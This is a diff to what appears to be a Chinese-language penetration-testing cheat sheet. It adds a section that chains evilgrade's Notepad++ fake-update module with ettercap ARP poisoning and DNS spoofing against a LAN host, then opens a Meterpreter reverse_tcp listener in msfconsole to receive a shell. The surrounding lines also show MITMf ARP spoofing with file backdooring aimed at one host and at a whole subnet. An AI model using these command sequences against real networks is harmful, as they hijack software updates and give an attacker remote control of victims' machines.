@@ -278,6 +278,33 @@ vi /etc/mitmf/mitmf.conf
 
 mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filepwn(欺骗192.168.1.101)
     mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
+    如果报错则要根据官网最接安装方法重新安装
+    https://github.com/byt3bl33d3r/MITMf/wiki/Installation
+</code></pre>
+</div>
+
+<h4 id="0xh-evilgrade">0xh evilgrade</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+
+1.kali下没有安装evilgrade需要:
+apt-get install isr-evilgrade,如果没成功则用最新版kali安装即可
+evilgrade
+show modules
+conf notepadplus
+show options
+set agent '["%out...."]'//这里参考youtube视频,设置agent为生成的shell的存放路径
+start
+
+2.ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    设置notepadplus的更新地址[上面evilgrade中的show options中的vhost的域名]的A记录解析到攻击者所在机器
+
+3.msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 4444
+set lhost xxx.xxx.xxx.xxx
+exploit
 </code></pre>
 </div>
 </span>
